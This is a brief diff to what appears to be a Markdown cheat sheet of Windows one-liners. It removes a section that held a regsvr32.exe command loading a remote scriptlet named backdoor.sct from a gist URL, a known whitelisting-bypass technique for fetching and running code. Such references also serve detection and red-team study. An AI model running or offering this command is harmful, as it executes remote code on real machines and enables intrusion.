@@ -2,9 +2,6 @@
 
 ## One Liners
 
-### Regsvr32 + sct file + powershell encoded command
-
-    regsvr32.exe /s https://gist.githubusercontent.com/MHaggis/31a1d0efd882d048436aeb7b9fd7f6d0/raw/b96dc20465abfeed3f05ba56b28e2ff91c398606/backdoor.sct
 
 ## net.exe
 
